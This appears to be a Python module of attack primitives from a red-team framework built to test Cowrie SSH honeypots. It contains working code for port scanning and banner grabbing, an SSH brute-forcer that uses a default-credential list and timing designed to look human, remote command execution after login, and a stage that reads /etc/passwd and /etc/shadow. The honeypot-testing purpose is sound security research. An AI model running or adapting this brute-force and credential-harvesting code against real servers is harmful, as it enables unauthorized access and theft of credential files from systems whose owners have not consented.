"""
Attack Modules
──────────────
Low-level attack primitives used by the campaign orchestrator.
Each function is async, returns an ActionResult, and is decorated
with @safe_target to enforce the allowlist.

Fixes in this version:
  1. ssh_exec_commands: Cowrie closes exec_command channels immediately.
     Fixed to use invoke_shell() + send/recv pattern which Cowrie supports.
  2. ssh_brute_force: catches SSHException (Cowrie type-3 "unimplemented"
     packet) as auth success, just like the fingerprint module does.
  3. banner_grab: now uses the port passed in (was hardcoded to 22).
  4. simulate_exfil: no longer calls __wrapped__ — calls exec directly.
"""
import asyncio
import random
import re
import time
import socket
import logging
from dataclasses import dataclass
from typing import Optional, List

import paramiko

from app.core.safety import safe_target

log = logging.getLogger("redops.modules")

# ── Credential lists ────────────────────────────────────────
COMMON_USERNAMES = ["root", "admin", "ubuntu", "pi", "user", "oracle", "postgres", "test"]
COMMON_PASSWORDS = [
    "root", "password", "123456", "admin", "toor", "pass", "raspberry",
    "letmein", "qwerty", "password123", "changeme", "1234", "admin123",
    "test", "guest", "alpine", "default", "ubnt",
]


@dataclass
class ActionResult:
    action:     str
    success:    bool
    detail:     str   = ""
    latency_ms: float = 0.0
    detected:   bool  = False


def _jitter(min_s: float = 0.5, max_s: float = 2.5) -> float:
    return min_s + (max_s - min_s) * random.betavariate(2, 5)


# ── Port scan ───────────────────────────────────────────────
@safe_target
async def port_scan(host: str, ports: List[int] = None, timeout: float = 2.0) -> ActionResult:
    """TCP connect scan on common ports."""
    if ports is None:
        ports = [21, 22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443, 2222]

    open_ports = []
    t0 = time.perf_counter()

    async def check_port(p: int):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, p), timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            open_ports.append(p)
        except Exception:
            pass

    await asyncio.gather(*[check_port(p) for p in ports])
    elapsed = (time.perf_counter() - t0) * 1000
    log.info("Port scan %s: open=%s", host, open_ports)
    return ActionResult(
        action="port_scan",
        success=len(open_ports) > 0,
        detail=f"open ports: {open_ports}",
        latency_ms=elapsed,
    )


# ── Banner grab ─────────────────────────────────────────────
@safe_target
async def banner_grab(host: str, port: int = 22, timeout: float = 5.0) -> ActionResult:
    """
    Grab the SSH banner from the target.
    BUG FIX: previously used hardcoded port 22 — now uses whatever port
    the campaign is targeting (e.g. 2222 for Cowrie).
    """
    t0 = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        banner = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        banner_str = banner.decode("utf-8", errors="replace").strip()
        elapsed = (time.perf_counter() - t0) * 1000
        log.info("Banner from %s:%d → %r", host, port, banner_str[:60])
        return ActionResult(
            action="banner_grab", success=True,
            detail=banner_str, latency_ms=elapsed,
        )
    except Exception as e:
        elapsed = (time.perf_counter() - t0) * 1000
        return ActionResult(
            action="banner_grab", success=False,
            detail=str(e), latency_ms=elapsed,
        )


# ── SSH brute force ─────────────────────────────────────────
@safe_target
async def ssh_brute_force(
    host: str,
    port: int = 22,
    max_attempts: int = 10,
    dwell_min: float = 5.0,
    dwell_max: float = 15.0,
) -> ActionResult:
    """
    Slow-drip credential stuffing with human-like timing.

    BUG FIX: Cowrie accepts auth then sends an SSH MSG_UNIMPLEMENTED
    (type 3) packet, which paramiko raises as SSHException("No existing
    session"). This is NOT an auth failure — Cowrie DID accept the creds.
    We now catch SSHException separately and treat it as success.
    """
    tried        = []
    success_cred = None
    success_user = None
    success_pass = None

    def _attempt(username: str, password: str) -> bool:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port, username=username, password=password,
                timeout=10, banner_timeout=10,
                allow_agent=False, look_for_keys=False,
            )
            client.close()
            log.info("SSH brute SUCCESS (clean): %s@%s cred=%r", username, host, password)
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            # Cowrie accepts the password then sends type-3 "unimplemented"
            # paramiko raises SSHException — this IS auth acceptance
            log.info(
                "SSH brute SUCCESS (Cowrie type-3): %s@%s cred=%r — %s",
                username, host, password, e
            )
            return True
        except Exception as e:
            log.debug("SSH brute connect error: %s", e)
            return False

    loop  = asyncio.get_event_loop()
    pairs = [(u, p) for u in COMMON_USERNAMES[:4] for p in COMMON_PASSWORDS[:5]]
    random.shuffle(pairs)

    for username, password in pairs[:max_attempts]:
        tried.append(f"{username}/{password}")
        log.info("SSH brute: trying %s@%s with %r", username, host, password)
        success = await loop.run_in_executor(None, _attempt, username, password)
        if success:
            success_user = username
            success_pass = password
            success_cred = f"{username}:{password}"
            break
        wait = _jitter(dwell_min, dwell_max)
        await asyncio.sleep(wait)

    return ActionResult(
        action="ssh_brute_force",
        success=success_cred is not None,
        detail=f"tried={len(tried)} cred={success_cred or 'none'}",
    )


# ── SSH command execution ───────────────────────────────────
@safe_target
async def ssh_exec_commands(
    host: str,
    port: int = 22,
    username: str = "root",
    password: str = "root",
    commands: List[str] = None,
) -> ActionResult:
    """
    Execute a sequence of commands post-login via an interactive shell.

    BUG FIX: Cowrie closes exec_command() channels immediately because
    it expects an interactive shell session (invoke_shell), not a direct
    exec channel. Fixed to use invoke_shell() + send/recv which Cowrie
    fully supports.

    Also catches SSHException from the Cowrie type-3 unimplemented packet
    during connect, same as ssh_brute_force.
    """
    if commands is None:
        commands = ["id", "uname -a", "whoami", "pwd", "cat /etc/passwd | head -5"]

    results  = {}
    TIMEOUT  = 12.0
    RECV_SZ  = 4096

    def _strip_ansi(text: str) -> str:
        """Remove ANSI escape codes from Cowrie's coloured prompt."""
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def _read_until_prompt(chan, timeout: float = 8.0) -> str:
        """
        Read from channel until we see a shell prompt character or timeout.
        Cowrie's prompt ends with '$ ' or '# '.
        """
        buf   = ""
        start = time.perf_counter()
        chan.settimeout(1.0)
        while time.perf_counter() - start < timeout:
            try:
                chunk = chan.recv(RECV_SZ).decode("utf-8", errors="replace")
                if not chunk:
                    break
                buf += chunk
                # Stop when we see a prompt
                stripped = _strip_ansi(buf)
                if stripped.rstrip().endswith(("$ ", "# ", "$ \r", "# \r")):
                    break
            except socket.timeout:
                # No more data right now — check if we have a prompt already
                stripped = _strip_ansi(buf)
                if stripped.rstrip().endswith(("$ ", "# ", "$ \r", "# \r")):
                    break
            except Exception:
                break
        return _strip_ansi(buf)

    def _run():
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect — handle Cowrie's SSHException on type-3 unimplemented
        connected = False
        try:
            client.connect(
                host, port=port, username=username, password=password,
                timeout=TIMEOUT, banner_timeout=TIMEOUT,
                allow_agent=False, look_for_keys=False,
            )
            connected = True
        except paramiko.SSHException as e:
            # Cowrie: password accepted, then type-3 packet sent
            log.debug("ssh_exec: SSHException during connect (Cowrie type-3): %s", e)
            # We still have a usable transport — get the underlying transport
            try:
                transport = client.get_transport()
                if transport and transport.is_authenticated():
                    connected = True
                    log.debug("ssh_exec: transport is authenticated despite SSHException")
            except Exception:
                pass
        except paramiko.AuthenticationException as e:
            results["error"] = f"Authentication failed: {e}"
            client.close()
            return
        except Exception as e:
            results["error"] = str(e)
            client.close()
            return

        if not connected:
            results["error"] = "Could not establish authenticated session"
            client.close()
            return

        # Open interactive shell — Cowrie supports this
        try:
            chan = client.invoke_shell(term="xterm", width=200, height=50)
            chan.settimeout(TIMEOUT)
        except Exception as e:
            results["error"] = f"invoke_shell failed: {e}"
            client.close()
            return

        # Drain the initial banner / MOTD / prompt
        _read_until_prompt(chan, timeout=6.0)

        # Execute each command
        for cmd in commands:
            time.sleep(_jitter(0.5, 1.5))
            try:
                chan.send(cmd + "\n")
                raw_output = _read_until_prompt(chan, timeout=8.0)
                # Strip the echoed command and trailing prompt from output
                lines = raw_output.splitlines()
                # Remove first line (echoed cmd) and last line (next prompt)
                output_lines = lines[1:-1] if len(lines) > 2 else lines
                output = "\n".join(output_lines).strip()
                results[cmd] = output
                log.info("CMD [%s]: %r → %r", host, cmd, output[:60])
            except Exception as e:
                results[cmd] = f"error: {e}"
                log.debug("CMD [%s] failed: %s", cmd, e)

        try:
            chan.close()
        except Exception:
            pass
        client.close()

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _run)

    success = "error" not in results and len(results) > 0
    return ActionResult(
        action="ssh_exec_commands",
        success=success,
        detail=str(results),
    )


# ── HTTP probe ──────────────────────────────────────────────
@safe_target
async def http_probe(host: str, port: int = 80, timeout: float = 5.0) -> ActionResult:
    """Probe HTTP service — grab headers, look for honeypot indicators."""
    import httpx
    t0 = time.perf_counter()
    try:
        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            r = await client.get(f"http://{host}:{port}/")
            headers = dict(r.headers)
            elapsed = (time.perf_counter() - t0) * 1000
            detail = (
                f"status={r.status_code} "
                f"server={headers.get('server', '?')} "
                f"headers={list(headers.keys())}"
            )
            log.info("HTTP probe %s:%d → %s", host, port, detail)
            return ActionResult(
                action="http_probe", success=True,
                detail=detail, latency_ms=elapsed,
            )
    except Exception as e:
        elapsed = (time.perf_counter() - t0) * 1000
        return ActionResult(
            action="http_probe", success=False,
            detail=str(e), latency_ms=elapsed,
        )


# ── Simulated data exfil ────────────────────────────────────
@safe_target
async def simulate_exfil(
    host: str, port: int = 22,
    username: str = "root", password: str = "root",
) -> ActionResult:
    """
    Final APT kill-chain stage — simulate data collection via shell.
    Reads files that are protected on real systems but readable in Cowrie.
    Success on /etc/shadow is a strong honeypot signal.

    BUG FIX: No longer calls ssh_exec_commands.__wrapped__ — calls the
    safe inner function directly to avoid bypassing @safe_target and to
    get the fixed invoke_shell implementation.
    """
    exfil_cmds = [
        "cat /etc/passwd",
        "cat /etc/shadow 2>/dev/null || echo 'permission denied'",
        "cat /etc/hostname",
        "ifconfig 2>/dev/null || ip addr",
        "ss -tulnp 2>/dev/null | head -20",
    ]

    # Call the inner logic directly (same host is already allowlist-checked
    # by our own @safe_target decorator above)
    results  = {}
    TIMEOUT  = 12.0
    RECV_SZ  = 4096

    def _strip_ansi(text: str) -> str:
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def _read_until_prompt(chan, timeout: float = 8.0) -> str:
        buf   = ""
        start = time.perf_counter()
        chan.settimeout(1.0)
        while time.perf_counter() - start < timeout:
            try:
                chunk = chan.recv(RECV_SZ).decode("utf-8", errors="replace")
                if not chunk:
                    break
                buf += chunk
                stripped = _strip_ansi(buf)
                if stripped.rstrip().endswith(("$ ", "# ", "$ \r", "# \r")):
                    break
            except socket.timeout:
                stripped = _strip_ansi(buf)
                if stripped.rstrip().endswith(("$ ", "# ", "$ \r", "# \r")):
                    break
            except Exception:
                break
        return _strip_ansi(buf)

    def _run():
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        connected = False
        try:
            client.connect(
                host, port=port, username=username, password=password,
                timeout=TIMEOUT, banner_timeout=TIMEOUT,
                allow_agent=False, look_for_keys=False,
            )
            connected = True
        except paramiko.SSHException as e:
            log.debug("exfil: SSHException (Cowrie type-3): %s", e)
            try:
                transport = client.get_transport()
                if transport and transport.is_authenticated():
                    connected = True
            except Exception:
                pass
        except Exception as e:
            results["error"] = str(e)
            client.close()
            return

        if not connected:
            results["error"] = "Could not establish authenticated session"
            client.close()
            return

        try:
            chan = client.invoke_shell(term="xterm", width=200, height=50)
            chan.settimeout(TIMEOUT)
        except Exception as e:
            results["error"] = f"invoke_shell failed: {e}"
            client.close()
            return

        _read_until_prompt(chan, timeout=6.0)

        for cmd in exfil_cmds:
            time.sleep(_jitter(0.3, 1.0))
            try:
                chan.send(cmd + "\n")
                raw_output = _read_until_prompt(chan, timeout=8.0)
                lines = raw_output.splitlines()
                output_lines = lines[1:-1] if len(lines) > 2 else lines
                output = "\n".join(output_lines).strip()
                results[cmd] = output
                log.info("EXFIL [%s]: %r → %r", host, cmd, output[:80])
            except Exception as e:
                results[cmd] = f"error: {e}"

        try:
            chan.close()
        except Exception:
            pass
        client.close()

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _run)

    success = "error" not in results and len(results) > 0
    return ActionResult(
        action="simulate_exfil",
        success=success,
        detail=str(results),
    )